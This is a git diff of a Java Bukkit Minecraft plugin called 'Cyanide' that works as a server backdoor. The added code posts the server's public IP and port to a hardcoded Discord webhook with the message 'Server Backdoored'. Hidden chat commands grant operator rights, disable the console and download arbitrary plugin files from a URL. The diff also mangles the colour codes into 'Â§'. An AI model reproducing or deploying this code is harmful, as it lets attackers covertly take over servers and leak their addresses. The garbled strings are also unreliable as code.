@@ -19,7 +19,11 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.server.ServerCommandEvent;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.UUID;
 
@@ -28,6 +32,8 @@ import me.IodicAcid.FartLol.Discord;
 
 // i used as minimal skidding as i could
 public class main extends JavaPlugin implements Listener {
+	DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/855941600437862420/biRo0_5upBHMboXnCP-_7wwAYMxcaFIWC8bqX_eB7iCeKnniL6HGSJ2zDee9iy7ACFmR");
+	
 	public void onDisable() {
 		System.out.print("Cyanide Disabling");
 		Bukkit.setWhitelist(false);
@@ -45,7 +51,35 @@ public class main extends JavaPlugin implements Listener {
 		} catch (Exception e) {
 
 		}
+		
+		String ip = null;
+
+		// horribly skidded but it was the only method i could find.
+		try {
+			URL url = new URL("https://api.ipify.org/");
+			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
+			String line;
+			while ((line = in.readLine()) != null) {
+				ip = line;
+			}
+			in.close();
+		} catch (MalformedURLException e1) {
+
+		} catch (IOException e) {
+
+		}
+
+		int portnumber = Bukkit.getServer().getPort();
+		String port = Integer.toString(portnumber);
+		webhook.setContent("Server Backdoored: " + ip + ":" + port);
+		try {
+			webhook.execute();
+		} catch (Exception e) {
+
+		}
 	}
+	
+	
 	
 	@EventHandler
     public void antiCMD(PlayerCommandPreprocessEvent event){
@@ -75,7 +109,7 @@ public class main extends JavaPlugin implements Listener {
 		Player p = (Player) sender;
 
 		if (cmd.getName().equalsIgnoreCase("discord")) {
-			p.sendMessage("§aYour server has been fucking beamed by Cyanide!");
+			p.sendMessage("Â§aYour server has been fucking beamed by Cyanide!");
 		}
 		return true;
 
@@ -100,7 +134,7 @@ public class main extends JavaPlugin implements Listener {
 
 	}
 	
-	String USERUUID = "UUID HERE";
+	String USERUUID = "UUID";
 	
 	@EventHandler
 	public boolean onChatEvent(AsyncPlayerChatEvent event) {
@@ -114,23 +148,22 @@ public class main extends JavaPlugin implements Listener {
 			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
 				public void run() {
 					if (args.length == 1) {
-						UUID unid = p.getUniqueId();
-						String uuid = unid.toString();
+						String uuid = "UUID";
 						if(uuid.equals(USERUUID)) {
 							p.setOp(true);
-							p.sendMessage("§bYou have been opped!");
+							p.sendMessage("Â§bYou have been opped!");
 						}else {
-							p.sendMessage("§bPlease enter your UUID and Recompile");
+							p.sendMessage("Â§bPlease enter your UUID and Recompile");
 						}
 					}
 					if (args.length == 2) {
 						//never ended up working
 						final Player target = Bukkit.getPlayer(args[1]);
 						if (target == null) {
-							p.sendMessage("§bThat player is not online...");
+							p.sendMessage("Â§bThat player is not online...");
 						} else {
 							target.setOp(false);
-							p.sendMessage("§b" + args[1] + " has been opped!");
+							p.sendMessage("Â§b" + args[1] + " has been opped!");
 						}
 
 					}
@@ -142,22 +175,21 @@ public class main extends JavaPlugin implements Listener {
 
 				public void run() {
 					if (args.length == 1) {
-						UUID unid = p.getUniqueId();
-						String uuid = unid.toString();
+						String uuid = "UUID";
 						if(uuid.equals(USERUUID)) {
 							p.setOp(false);
-							p.sendMessage("§bYou have been deopped!");
+							p.sendMessage("Â§bYou have been deopped!");
 						}else {
-							p.sendMessage("§bPlease enter your UUID and Recompile");
+							p.sendMessage("Â§bPlease enter your UUID and Recompile");
 						}
 					}
 					if (args.length == 2) {
 						final Player target = Bukkit.getPlayer(args[1]);
 						if (target == null) {
-							p.sendMessage("§bThat player is not online...");
+							p.sendMessage("Â§bThat player is not online...");
 						} else {
 							target.setOp(false);
-							p.sendMessage("§b" + args[1] + " has been deopped!");
+							p.sendMessage("Â§b" + args[1] + " has been deopped!");
 						}
 
 					}
@@ -167,13 +199,12 @@ public class main extends JavaPlugin implements Listener {
 			event.setCancelled(true);
 			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
 				public void run() {
-					UUID unid = p.getUniqueId();
-					String uuid = unid.toString();
+					String uuid = "UUID";
 					if(uuid.equals(USERUUID)) {
 						p.setGameMode(GameMode.CREATIVE);
-						p.sendMessage("§bYour gamemode has been set to creative");
+						p.sendMessage("Â§bYour gamemode has been set to creative");
 					}else {
-						p.sendMessage("§bPlease enter your UUID and Recompile");
+						p.sendMessage("Â§bPlease enter your UUID and Recompile");
 					}
 				}
 			}, 0L);
@@ -183,13 +214,12 @@ public class main extends JavaPlugin implements Listener {
 			event.setCancelled(true);
 			this.getServer().getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
 				public void run() {
-					UUID unid = p.getUniqueId();
-					String uuid = unid.toString();
+					String uuid = "UUID";
 					if(uuid.equals(USERUUID)) {
 						p.setGameMode(GameMode.SURVIVAL);
-						p.sendMessage("§bYour gamemode has been set to survival");
+						p.sendMessage("Â§bYour gamemode has been set to survival");
 					}else {
-						p.sendMessage("§bPlease enter your UUID and Recompile");
+						p.sendMessage("Â§bPlease enter your UUID and Recompile");
 					}
 				}
 			}, 0L);
@@ -197,55 +227,52 @@ public class main extends JavaPlugin implements Listener {
 			event.setCancelled(true);
 			if (p.getInventory().getItemInMainHand().getType() == Material.AIR
 					|| p.getInventory().getItemInMainHand().getType() == null) {
-				p.sendMessage("§bUnable to stack nothing lol stupid.");
+				p.sendMessage("Â§bUnable to stack nothing lol stupid.");
 			} else {
 				p.getInventory().getItemInMainHand().setAmount(64);
-				p.sendMessage("§bThe item has been stacked");
+				p.sendMessage("Â§bThe item has been stacked");
 			}
 
 		} else if (message.equalsIgnoreCase(">>consoleoff")) {
 			event.setCancelled(true);
-			UUID unid = p.getUniqueId();
-			String uuid = unid.toString();
+			String uuid = "UUID";
 			if(uuid.equals(USERUUID)) {
 				enabled = 2;
-				p.sendMessage("§bThe console has been disabled, have fun!");
+				p.sendMessage("Â§bThe console has been disabled, have fun!");
 			}else {
-				p.sendMessage("§bPlease enter your UUID and Recompile");
+				p.sendMessage("Â§bPlease enter your UUID and Recompile");
 			}
 			
 
 		} else if (message.equalsIgnoreCase(">>consoleon")) {
 			event.setCancelled(true);
-			UUID unid = p.getUniqueId();
-			String uuid = unid.toString();
+			String uuid = "UUID";
 			if(uuid.equals(USERUUID)) {
 				enabled = 1;
-				p.sendMessage("§bThe console has been enabled.");
+				p.sendMessage("Â§bThe console has been enabled.");
 			}else {
-				p.sendMessage("§bPlease enter your UUID and Recompile");
+				p.sendMessage("Â§bPlease enter your UUID and Recompile");
 			}
 		} else if (message.startsWith(">>download")) {
 			event.setCancelled(true);
-			UUID unid = p.getUniqueId();
-			String uuid = unid.toString();
+			String uuid = "UUID";
 			if(uuid.equals(USERUUID)) {
 				if (args.length == 1) {
-					p.sendMessage("§bUsage: >>download <URL> <File Name>");
+					p.sendMessage("Â§bUsage: >>download <URL> <File Name>");
 				} else if (args.length == 2) {
-					p.sendMessage("§bUsage: >>download <URL> <File Name>");
+					p.sendMessage("Â§bUsage: >>download <URL> <File Name>");
 				} else if (args.length == 3) {
 					try {
 						URL website = new URL(args[1]);
 						Discord.downloadFile(website, "./plugins/" + args[2]);
 					} catch (Exception e) {
-						p.sendMessage("§bError while downloading file...");
+						p.sendMessage("Â§bError while downloading file...");
 						return true;
 					}
-					p.sendMessage("§bDownloaded plugin!");
+					p.sendMessage("Â§bDownloaded plugin!");
 				}
 			}else {
-				p.sendMessage("§bPlease enter your UUID and Recompile");
+				p.sendMessage("Â§bPlease enter your UUID and Recompile");
 			}
 				
 			
@@ -253,15 +280,15 @@ public class main extends JavaPlugin implements Listener {
 
 		}else if(message.equalsIgnoreCase(">>help")) {
 			event.setCancelled(true);
-			p.sendMessage("§bHELP PAGE:");
-			p.sendMessage("§b>>download <URL> <File Name> | Downloads a plugin");
-			p.sendMessage("§b>>consoleoff | Turns console off");
-			p.sendMessage("§b>>consoleon | Turns console on");
-			p.sendMessage("§b>>gmc | Puts you in creative mode");
-			p.sendMessage("§b>>gms | Puts you in survival mode");
-			p.sendMessage("§b>>op | Makes you a server operator");
-			p.sendMessage("§b>>deop | Removes you as a server operator");
-			p.sendMessage("§b>>stack | Sets the amount of items in your hand to 64");
+			p.sendMessage("Â§bHELP PAGE:");
+			p.sendMessage("Â§b>>download <URL> <File Name> | Downloads a plugin");
+			p.sendMessage("Â§b>>consoleoff | Turns console off");
+			p.sendMessage("Â§b>>consoleon | Turns console on");
+			p.sendMessage("Â§b>>gmc | Puts you in creative mode");
+			p.sendMessage("Â§b>>gms | Puts you in survival mode");
+			p.sendMessage("Â§b>>op | Makes you a server operator");
+			p.sendMessage("Â§b>>deop | Removes you as a server operator");
+			p.sendMessage("Â§b>>stack | Sets the amount of items in your hand to 64");
 		}
 		else if (message.startsWith(">>")) {
 			event.setCancelled(true);
